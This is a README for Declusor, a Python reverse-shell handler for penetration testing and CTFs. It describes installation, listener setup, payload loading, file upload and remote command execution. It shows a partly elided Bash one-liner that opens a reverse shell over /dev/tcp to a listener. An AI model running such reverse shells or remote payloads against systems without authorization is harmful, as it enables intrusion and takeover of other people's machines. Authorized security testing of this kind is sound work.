# Declusor: Remote Control and Payload Delivery Handler

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
![Python 3.x](https://img.shields.io/badge/python-3.x-blue.svg)

**Declusor** is a fast, flexible, and modular Python tool built for penetration testers, CTF players, and security professionals. It streamlines payload delivery and provides reliable remote control through a unified, interactive CLI.

Its intelligent command-line interface boosts productivity with smart command and path completion, while supporting remote command execution, interactive sessions, payload management, and file transfers — all in one place.

![Capabilities Overview](https://i.imgur.com/Wsw2l90.gif)

> [!WARNING]
> **Legal Notice**: This software is intended solely for educational use and authorized security research. The developers assume no liability for any misuse or unlawful activity carried out with this tool. Executing this software on networks or systems without ownership or explicit, written authorization for any form of testing or operation is strictly prohibited.

## Features

- **Shell Management**: Establish, maintain, and manage reverse shell sessions with connected targets.
- **Interactive Shell**: Spawn a fully interactive shell on the remote host for real-time command execution.
- **Command Execution**: Execute arbitrary commands on the remote system and return the output to the handler.
- **File Upload**: Transfer files from the local machine to the remote host.
- **Local File Execution**: Execute scripts or binaries stored on the local machine directly on the remote system.
- **Payload Execution**: Load and execute arbitrary payloads on the remote host.
- **Command-Line Completion**: Built-in completion for handler commands and local file paths to streamline command input and navigation.

## Getting Started

### Prerequisites

- **Python 3.x** installed on the local machine running Declusor.
- **Unix-like target system**: The payload relies on standard utilities available on Linux, macOS, and other Unix-like systems.

### Installation

Verify Python is available:

```bash
python3 --version
```

Clone the repository:

```bash
git clone https://github.com/othonhugo/declusor.git
cd declusor
```

Create a virtual environment:

```bash
python3 -m venv .venv
```

Activate the environment:

```bash
# Linux / macOS
source .venv/bin/activate
```

```powershell
# Windows
.venv\Scripts\Activate.ps1
```

Install the project in editable mode:

```bash
pip install -e .
```

Declusor relies only on the **Python standard library**, so no additional dependencies are required.

## Usage

### Local Machine: Starting the Listener

Run Declusor with the desired listener address and port:

```bash
declusor <LISTENER_IP> <LISTENER_PORT>
```

Example:

```bash
declusor 127.0.0.1 4444
```

After startup, Declusor prints a Bash one-liner that must be executed on the target system to initiate the reverse shell.

### Remote Machine: Establishing the Reverse Shell

Execute the printed one-liner on the target machine:

```bash
( exec 3<> /dev/tcp/127.0.0.1/4444; while [...] done <&3 >&3 2>&3 )
```

Once executed, the target connects back to the listener and an interactive session becomes available.

### Interacting with the Target

After a successful connection, the prompt changes to:

```
[declusor]
```

Example interaction:

```
[declusor] help
help    : Display detailed information about available commands or a specific command.
load    : Load a payload file from your local system and execute it on the remote system
command : Execute a single command on the remote system.
shell   : Initiate an interactive shell session on the remote system.
upload  : Upload a file from the local system to the remote system.
execute : Execute a program or script from the local system on the remote system.
exit    : Terminate the session and exit the program.
```

Example payload execution:

```
[declusor] load discovery/dev_tools.sh

DEVELOPMENT TOOLS
-----------------
/usr/bin/nc
/usr/bin/netcat
/usr/bin/gcc
/usr/bin/wget
/usr/bin/curl
```

## Customizing and Extending Payloads

Declusor can be extended by creating or modifying payloads in the `data` directory. The directory is organized into two main components.

### `./data/library/`

This directory contains scripts that are automatically transmitted to the target after a connection is established.

These scripts remain loaded in memory on the target system and provide reusable subroutines that other payloads can call during the session.

### `./data/modules/`

This directory contains on-demand payloads executed through the `load` command.

Modules are organized into categories, and their output is returned to the Declusor handler. The `load` command automatically scans this directory and lists available modules, simplifying payload discovery and execution.

## Contributing

Contributions are welcome. The project prioritizes **clarity, correctness, and modular design**.

Areas where contributions are particularly valuable:

- **Command Handlers**: Implement new handler commands to extend functionality (e.g., reconnaissance, privilege escalation, or post-exploitation tasks).
- **Payload Development**: Create new scripts for `data/library/` (persistent subroutines loaded at connection time) or `data/modules/` (payloads executed on demand).
- **Cross-Platform Support**: Improve compatibility across operating systems, particularly for the target-side one-liner and remote execution behavior.
- **Documentation**: Improve documentation, add usage examples, or provide practical walkthroughs.
- **Bug Fixes and Stability**: Identify and resolve bugs, improve error handling, and strengthen network communication reliability.
- **Code Quality**: Refactor code to improve readability, modularity, and maintainability.
- **Testing**: Expand unit and integration tests to improve reliability and prevent regressions.

Pull requests that improve **usability, reliability, or extensibility** are especially appreciated.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
